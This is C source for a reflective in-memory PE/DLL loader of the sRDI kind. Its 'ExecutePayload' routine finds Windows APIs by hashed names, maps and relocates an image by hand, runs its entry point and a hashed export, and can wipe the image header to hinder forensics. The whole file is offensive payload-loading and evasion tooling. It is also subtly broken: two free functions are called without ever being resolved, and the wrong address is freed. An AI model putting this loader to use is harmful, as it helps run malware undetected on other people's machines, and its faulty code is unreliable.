#define WIN32_LEAN_AND_MEAN

#pragma warning( disable : 4201 ) // Disable warning about 'nameless struct/union'

#include "GetProcAddressWithHash.h"

#include <windows.h>
#include <intrin.h>

// we declare some common stuff in here...

#define DLL_QUERY_HMODULE		6

#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(DWORD64 *)(name)
#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)
#define DEREF_8( name )*(BYTE *)(name)

typedef ULONG_PTR(WINAPI * REFLECTIVELOADER)(LPVOID lpParameter, LPVOID lpLibraryAddress, DWORD dwFunctionHash, LPVOID lpUserData, DWORD nUserdataLen, BOOL exitThread);
typedef BOOL(WINAPI * DLLMAIN)(HINSTANCE, DWORD, LPVOID);

typedef HMODULE(WINAPI * LOADLIBRARYA)(LPCSTR);
typedef FARPROC(WINAPI * GETPROCADDRESS)(HMODULE, LPCSTR);
typedef LPVOID(WINAPI * VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
typedef VOID(WINAPI * EXITTHREAD)(DWORD);
typedef DWORD(NTAPI  * NTFLUSHINSTRUCTIONCACHE)(HANDLE, PVOID, ULONG);
typedef VOID(WINAPI * GETNATIVESYSTEMINFO)(LPSYSTEM_INFO);
typedef BOOL(WINAPI * VIRTUALPROTECT)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef int (WINAPI * MESSAGEBOXA)(HWND, LPSTR, LPSTR, UINT);
typedef BOOL(WINAPI * VIRTUALFREE)(LPVOID, SIZE_T, DWORD);
typedef BOOL(WINAPI * LOCALFREE)(LPVOID);

typedef BOOL(* EXPORTFUNC)(LPVOID, DWORD);

/** NOTE: module hashes are computed using all-caps unicode strings */
#define KERNEL32DLL_HASH				0x6A4ABC5B
#define NTDLLDLL_HASH					0x3CFA685D

#define LOADLIBRARYA_HASH				0x726774c
#define GETPROCADDRESS_HASH				0x7802f749
#define VIRTUALALLOC_HASH				0xe553a458
#define EXITTHREAD_HASH					0xa2a1de0
#define NTFLUSHINSTRUCTIONCACHE_HASH	0x945cb1af
#define RTLEXITUSERTHREAD_HASH			0xFF7F061A // Vista+
#define GETNATIVESYSTEMINFO_HASH	    0x959e0033
#define VIRTUALPROTECT_HASH				0xc38ae110
#define MESSAGEBOXA_HASH				0x7568345
#define LOCALFREE_HASH					0xea61fcb1			
#define VIRTUALFREE_HASH				0x300f2f0b

#define HASH_KEY						13

#define SRDI_CLEARHEADER 0x1
#define SRDI_CLEARMEMORY 0x2

#ifdef _WIN64
#define HOST_MACHINE IMAGE_FILE_MACHINE_AMD64
#else
#define HOST_MACHINE IMAGE_FILE_MACHINE_I386
#endif

typedef struct _UNICODE_STR
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR pBuffer;
} UNICODE_STR, *PUNICODE_STR;

typedef struct _PEB_FREE_BLOCK 
{
	struct _PEB_FREE_BLOCK * pNext;
	DWORD dwSize;
} PEB_FREE_BLOCK, *PPEB_FREE_BLOCK;

typedef struct __PEB
{
	BYTE bInheritedAddressSpace;
	BYTE bReadImageFileExecOptions;
	BYTE bBeingDebugged;
	BYTE bSpareBool;
	LPVOID lpMutant;
	LPVOID lpImageBaseAddress;
	PPEB_LDR_DATA pLdr;
	LPVOID lpProcessParameters;
	LPVOID lpSubSystemData;
	LPVOID lpProcessHeap;
	PRTL_CRITICAL_SECTION pFastPebLock;
	LPVOID lpFastPebLockRoutine;
	LPVOID lpFastPebUnlockRoutine;
	DWORD dwEnvironmentUpdateCount;
	LPVOID lpKernelCallbackTable;
	DWORD dwSystemReserved;
	DWORD dwAtlThunkSListPtr32;
	PPEB_FREE_BLOCK pFreeList;
	DWORD dwTlsExpansionCounter;
	LPVOID lpTlsBitmap;
	DWORD dwTlsBitmapBits[2];
	LPVOID lpReadOnlySharedMemoryBase;
	LPVOID lpReadOnlySharedMemoryHeap;
	LPVOID lpReadOnlyStaticServerData;
	LPVOID lpAnsiCodePageData;
	LPVOID lpOemCodePageData;
	LPVOID lpUnicodeCaseTableData;
	DWORD dwNumberOfProcessors;
	DWORD dwNtGlobalFlag;
	LARGE_INTEGER liCriticalSectionTimeout;
	DWORD dwHeapSegmentReserve;
	DWORD dwHeapSegmentCommit;
	DWORD dwHeapDeCommitTotalFreeThreshold;
	DWORD dwHeapDeCommitFreeBlockThreshold;
	DWORD dwNumberOfHeaps;
	DWORD dwMaximumNumberOfHeaps;
	LPVOID lpProcessHeaps;
	LPVOID lpGdiSharedHandleTable;
	LPVOID lpProcessStarterHelper;
	DWORD dwGdiDCAttributeList;
	LPVOID lpLoaderLock;
	DWORD dwOSMajorVersion;
	DWORD dwOSMinorVersion;
	WORD wOSBuildNumber;
	WORD wOSCSDVersion;
	DWORD dwOSPlatformId;
	DWORD dwImageSubsystem;
	DWORD dwImageSubsystemMajorVersion;
	DWORD dwImageSubsystemMinorVersion;
	DWORD dwImageProcessAffinityMask;
	DWORD dwGdiHandleBuffer[34];
	LPVOID lpPostProcessInitRoutine;
	LPVOID lpTlsExpansionBitmap;
	DWORD dwTlsExpansionBitmapBits[32];
	DWORD dwSessionId;
	ULARGE_INTEGER liAppCompatFlags;
	ULARGE_INTEGER liAppCompatFlagsUser;
	LPVOID lppShimData;
	LPVOID lpAppCompatInfo;
	UNICODE_STR usCSDVersion;
	LPVOID lpActivationContextData;
	LPVOID lpProcessAssemblyStorageMap;
	LPVOID lpSystemDefaultActivationContextData;
	LPVOID lpSystemAssemblyStorageMap;
	DWORD dwMinimumStackCommit;
} _PEB, *_PPEB;

#pragma warning( push )
#pragma warning( disable : 4214 ) // nonstandard extension
typedef struct
{
	WORD	offset : 12;
	WORD	type : 4;
} IMAGE_RELOC, *PIMAGE_RELOC;
#pragma warning(pop)

static inline size_t
AlignValueUp(size_t value, size_t alignment) {
	return (value + alignment - 1) & ~(alignment - 1);
}

// Write the logic for the primary payload here
// Normally, I would call this 'main' but if you call a function 'main', link.exe requires that you link against the CRT
// Rather, I will pass a linker option of "/ENTRY:ExecutePayload" in order to get around this issue.
ULONG_PTR ExecutePayload(ULONG_PTR uiLibraryAddress, DWORD dwFunctionHash, LPVOID lpUserData, DWORD nUserdataLen, DWORD flags)
{
	#pragma warning( push )
	#pragma warning( disable : 4055 ) // Ignore cast warnings

	// the functions we need
	LOADLIBRARYA pLoadLibraryA = NULL;
	GETPROCADDRESS pGetProcAddress = NULL;
	VIRTUALALLOC pVirtualAlloc = NULL;
	EXITTHREAD pExitThread = NULL;
	NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;
	GETNATIVESYSTEMINFO pGetNativeSystemInfo = NULL;
	VIRTUALPROTECT pVirtualProtect = NULL;
	VIRTUALFREE pVirtualFree = NULL;
	LOCALFREE pLocalFree = NULL;
	//MESSAGEBOXA pMessageBoxA = NULL;

	PIMAGE_DATA_DIRECTORY directory = NULL;
	PIMAGE_EXPORT_DIRECTORY exports = NULL;
	int idx;
	DWORD nameSearchIndex;
	DWORD *nameRef = NULL;
	WORD *ordinal = NULL;
	PCSTR pTempChar;
	DWORD dwCalculatedFunctionHash;
	DWORD alignedImageSize;

	SYSTEM_INFO sysInfo;

	DWORD executable;
	DWORD readable;
	DWORD writeable;
	DWORD protect;
	DWORD oldProtect = 0;

	PIMAGE_SECTION_HEADER section;
	size_t optionalSectionSize;
	size_t lastSectionEnd = 0;

	EXPORTFUNC f = NULL;

	// the initial location of this image in memory
	//ULONG_PTR uiLibraryAddress;
	// the kernels base address and later this images newly loaded base address
	ULONG_PTR uiBaseAddress;

	// variables for processing the kernels export table
	ULONG_PTR uiAddressArray;
	ULONG_PTR uiNameArray;
	ULONG_PTR uiExportDir;

	// variables for loading this image
	ULONG_PTR uiHeaderValue;
	ULONG_PTR uiValueA;
	ULONG_PTR uiValueB;
	ULONG_PTR uiValueC;
	ULONG_PTR uiValueD;
	ULONG_PTR uiValueE;

	// exit code for current thread
	DWORD dwExitCode = 1;

	///
	// STEP 1: Locate all the required functions
	///

	//pMessageBoxA = (MESSAGEBOXA)GetProcAddressWithHash(MESSAGEBOXA_HASH);

	pLoadLibraryA = (LOADLIBRARYA)GetProcAddressWithHash(LOADLIBRARYA_HASH);
	pGetProcAddress = (GETPROCADDRESS)GetProcAddressWithHash(GETPROCADDRESS_HASH);
	pVirtualAlloc = (VIRTUALALLOC)GetProcAddressWithHash(VIRTUALALLOC_HASH);
	pVirtualProtect = (VIRTUALPROTECT)GetProcAddressWithHash(VIRTUALPROTECT_HASH);
	pExitThread = (EXITTHREAD)GetProcAddressWithHash(EXITTHREAD_HASH);
	pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)GetProcAddressWithHash(NTFLUSHINSTRUCTIONCACHE_HASH);
	pGetNativeSystemInfo = (GETNATIVESYSTEMINFO)GetProcAddressWithHash(GETNATIVESYSTEMINFO_HASH);

	///
	// STEP 2: load our image into a new permanent location in memory
	///

	// get the VA of the NT Header for the PE to be loaded
	uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;


	// Perform sanity checks on the image (Stolen from https://github.com/fancycode/MemoryModule/blob/master/MemoryModule.c)

	if (((PIMAGE_NT_HEADERS)uiHeaderValue)->Signature != IMAGE_NT_SIGNATURE)
		return 0;

	if (((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.Machine != HOST_MACHINE)
		return 0;

	if (((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SectionAlignment & 1)
		return 0;


	// Align the image to the page size (Stolen from https://github.com/fancycode/MemoryModule/blob/master/MemoryModule.c)

	section = IMAGE_FIRST_SECTION(((PIMAGE_NT_HEADERS)uiHeaderValue));
	optionalSectionSize = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SectionAlignment;
	for (idx = 0; idx < ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections; idx++, section++) {
		size_t endOfSection;
		if (section->SizeOfRawData == 0) {
			// Section without data in the DLL
			endOfSection = section->VirtualAddress + optionalSectionSize;
		}
		else {
			endOfSection = section->VirtualAddress + section->SizeOfRawData;
		}

		if (endOfSection > lastSectionEnd) {
			lastSectionEnd = endOfSection;
		}
	}

	pGetNativeSystemInfo(&sysInfo);
	alignedImageSize = (DWORD)AlignValueUp(((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, sysInfo.dwPageSize);
	if (alignedImageSize != AlignValueUp(lastSectionEnd, sysInfo.dwPageSize))
		return 0;

	// allocate all the memory for the DLL to be loaded into. Attempt to use the preffered base address
	// Also zeros all memory and marks it as READ and WRITE.
	uiBaseAddress = (ULONG_PTR)pVirtualAlloc(
		(LPVOID)(((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase),
		((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, 
		MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE
	);

	if (uiBaseAddress == 0)
		uiBaseAddress = (ULONG_PTR)pVirtualAlloc(
			NULL, 
			((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage,
			MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE
		);

	// we must now copy over the headers
	uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
	uiValueB = uiLibraryAddress;
	uiValueC = uiBaseAddress;
	uiValueD = 0;
	uiValueE = FIELD_OFFSET(IMAGE_DOS_HEADER, e_lfanew);

	while (uiValueA--) {
		if ((flags & SRDI_CLEARHEADER) && uiValueD < (uiHeaderValue - uiLibraryAddress) && (uiValueD < uiValueE || uiValueD > (uiValueE + sizeof(WORD)))) {
			// Blow away everything before the NT_HEADERS. Leave e_lfanew;
			*(BYTE *)uiValueC++ = '\0';
			uiValueB++;
		}
		else
			*(BYTE *)uiValueC++ = *(BYTE *)uiValueB++;

		uiValueD++;
	}
	
	///
	// STEP 3: load in all of our sections
	///

	// uiValueA = the VA of the first section
	uiValueA = ((ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader);

	// iterate through all sections, loading them into memory.
	uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
	while (uiValueE--)
	{
		// uiValueB is the VA for this section
		uiValueB = (uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress);

		// uiValueC if the VA for this sections data
		uiValueC = (uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData);

		// copy the section over
		uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;

		if (uiValueD == 0) {
			/// Currently will cause memset to get linked

			//// If the seciton is empty, fill in a zeroed block of X (section alignment) size

			//uiValueD = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SectionAlignment;

			//while (uiValueD--)
			//	// Silly trick to avoid the optimized link to memset.
			//	*(BYTE *)uiValueB++ = 0x00;
		}
		else {
			while (uiValueD--)	
				*(BYTE *)uiValueB++ = *(BYTE *)uiValueC++;
		}
			
		// get the VA of the next section
		uiValueA += sizeof(IMAGE_SECTION_HEADER);
	}
	
	///
	// STEP 4: process our images import table
	///

	// uiValueB = the address of the import directory
	uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	// we assume their is an import table to process
	// uiValueC is the first entry in the import table
	uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);

	// itterate through all imports
	while (((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name)
	{
		// use LoadLibraryA to load the imported module into memory
		uiLibraryAddress = (ULONG_PTR)pLoadLibraryA((LPCSTR)(uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name));

		// uiValueD = VA of the OriginalFirstThunk
		uiValueD = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk);

		// uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
		uiValueA = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk);
		
		// itterate through all imported functions, importing by ordinal if no name present
		while (DEREF(uiValueA))
		{
			
			// sanity check uiValueD as some compilers only import by FirstThunk
			if (((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal && uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			{

				// get the VA of the modules NT Header
				uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
				
				// uiNameArray = the address of the modules export directory entry
				uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

				// get the VA of the export directory
				uiExportDir = (uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);

				// get the VA for the array of addresses
				uiAddressArray = (uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions);

				// use the import ordinal (- export ordinal base) as an index into the array of addresses
				uiAddressArray += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal) - ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->Base) * sizeof(DWORD));

				// patch in the address for this imported function
				DEREF(uiValueA) = (uiLibraryAddress + DEREF_32(uiAddressArray));
			}
			else
			{
				
				// get the VA of this functions import by name struct
				uiValueB = (uiBaseAddress + DEREF(uiValueA));

				// use GetProcAddress and patch in the address for this imported function
				DEREF(uiValueA) = (ULONG_PTR)pGetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);
			}
			
			// get the next imported function
			uiValueA += sizeof(ULONG_PTR);
			if (uiValueD)
				uiValueD += sizeof(ULONG_PTR);
		}

		// get the next import
		uiValueC += sizeof(IMAGE_IMPORT_DESCRIPTOR);
	}
	
	///
	// STEP 5: process all of our images relocations
	///

	// calculate the base address delta and perform relocations (assuming we missed the preferred address)
	uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;

	if (uiLibraryAddress != 0) {
		// uiValueB = the address of the relocation directory
		uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

		// check if their are any relocations present
		if (((PIMAGE_DATA_DIRECTORY)uiValueB)->Size)
		{
			// uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
			uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);

			// and we itterate through all entries...
			while (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock)
			{
				// uiValueA = the VA for this relocation block
				uiValueA = (uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress);

				// uiValueB = number of entries in this relocation block
				uiValueB = (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);

				// uiValueD is now the first entry in the current relocation block
				uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);

				// we itterate through all the entries in the current block...
				while (uiValueB--)
				{
					// perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
					// we dont use a switch statement to avoid the compiler building a jump table
					// which would not be very position independent!
					if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64)
						*(ULONG_PTR *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
					else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW)
						*(DWORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
					else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH)
						*(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
					else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW)
						*(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);

					// get the next entry in the current relocation block
					uiValueD += sizeof(IMAGE_RELOC);
				}

				// get the next entry in the relocation directory
				uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
			}
		}
	}
	

	///
	// STEP 6: Finalize our sections. Set memory protections.
	///

	uiValueA = ((ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader);

	// itterate through all sections, loading them into memory.
	uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
	while (uiValueE--)
	{
		if (((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData > 0) {

			// determine protection flags based on characteristics
			executable = (((PIMAGE_SECTION_HEADER)uiValueA)->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
			readable = (((PIMAGE_SECTION_HEADER)uiValueA)->Characteristics & IMAGE_SCN_MEM_READ) != 0;
			writeable = (((PIMAGE_SECTION_HEADER)uiValueA)->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;

			if (!executable && !readable && !writeable)
				protect = PAGE_NOACCESS;
			else if (!executable && !readable && writeable)
				protect = PAGE_WRITECOPY;
			else if (!executable && readable && !writeable)
				protect = PAGE_READONLY;
			else if (!executable && readable && writeable)
				protect = PAGE_READWRITE;
			else if (executable && !readable && !writeable)
				protect = PAGE_EXECUTE;
			else if (executable && !readable && writeable)
				protect = PAGE_EXECUTE_WRITECOPY;
			else if (executable && readable && !writeable)
				protect = PAGE_EXECUTE_READ;
			else if (executable && readable && writeable)
				protect = PAGE_EXECUTE_READWRITE;

			if (((PIMAGE_SECTION_HEADER)uiValueA)->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) {
				protect |= PAGE_NOCACHE;
			}

			// change memory access flags
			if (!pVirtualProtect((LPVOID)(uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress),
								((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData,
								protect, &oldProtect))
				return 0;
		}

		// get the VA of the next section
		uiValueA += sizeof(IMAGE_SECTION_HEADER);
	}


	///
	// STEP 7: execute TLS callbacks
	///

	// uiValueB = the address of the TLS directory
	uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

	// check if their are any TLS callbacks required
	if (((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress)
	{
		// uiValueC is the TLS directory
		uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);
		PIMAGE_TLS_DIRECTORY test = (PIMAGE_TLS_DIRECTORY)uiValueC;

		// uiValueD is the first callback entry
		uiValueD = (PIMAGE_TLS_CALLBACK *)((PIMAGE_TLS_DIRECTORY)uiValueC)->AddressOfCallBacks;
		PIMAGE_TLS_CALLBACK * test2 = (PIMAGE_TLS_CALLBACK *)uiValueD;

		if (uiValueD) {
			while (*(PIMAGE_TLS_CALLBACK *)uiValueD) {
				(*(PIMAGE_TLS_CALLBACK *)uiValueD)((LPVOID)uiBaseAddress, DLL_PROCESS_ATTACH, NULL);
				(PIMAGE_TLS_CALLBACK *)uiValueD++;
			}
		}
	}

	///
	// STEP 8: call our images entry point
	///

	// uiValueA = the VA of our newly loaded DLL/EXE's entry point
	uiValueA = (uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint);

	// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
	pNtFlushInstructionCache((HANDLE)-1, NULL, 0);

	// call our respective entry point, fudging our hInstance value
	// if we are injecting a DLL via LoadRemoteLibraryR we call DllMain and pass in our parameter (via the DllMain lpReserved parameter)

	((DLLMAIN)uiValueA)((HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, (LPVOID)1);

	///
	// STEP 9: call our exported function
	///
	if (dwFunctionHash) {
		
		do
		{
			directory = &((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
			if (directory->Size == 0)
				break;

			exports = (PIMAGE_EXPORT_DIRECTORY)(uiBaseAddress + directory->VirtualAddress);
			if (exports->NumberOfNames == 0 || exports->NumberOfFunctions == 0)
				break;

			// search function name in list of exported names
			idx = -1;
			nameRef = (DWORD *)(uiBaseAddress + exports->AddressOfNames);
			ordinal = (WORD *)(uiBaseAddress + exports->AddressOfNameOrdinals);
			for (nameSearchIndex = 0; nameSearchIndex < exports->NumberOfNames; nameSearchIndex++, nameRef++, ordinal++) {

				pTempChar = (char *)(uiBaseAddress + (*nameRef));
				dwCalculatedFunctionHash = 0;

				do
				{
					dwCalculatedFunctionHash = ROTR32(dwCalculatedFunctionHash, 13);
					dwCalculatedFunctionHash += *pTempChar;
					pTempChar++;
				} while (*(pTempChar - 1) != 0);

				if (dwFunctionHash == dwCalculatedFunctionHash)
				{
					idx = *ordinal;
					break;
				}
			}
			if (idx == -1)
				break;

			// AddressOfFunctions contains the RVAs to the "real" functions
			f = (EXPORTFUNC)(uiBaseAddress + (*(DWORD *)(uiBaseAddress + exports->AddressOfFunctions + (idx * 4))));
			if (!f(lpUserData, nUserdataLen))
				break;

			dwExitCode = 0;
		} while (0);
	}

	if (flags & SRDI_CLEARMEMORY) {
		uiValueA = pVirtualFree((LPVOID)uiLibraryAddress, 0, 0x8000);

		if (!uiValueA)
			pLocalFree((LPVOID)uiLibraryAddress);
	}

	return uiBaseAddress; //Atempt to return a handle to the module
}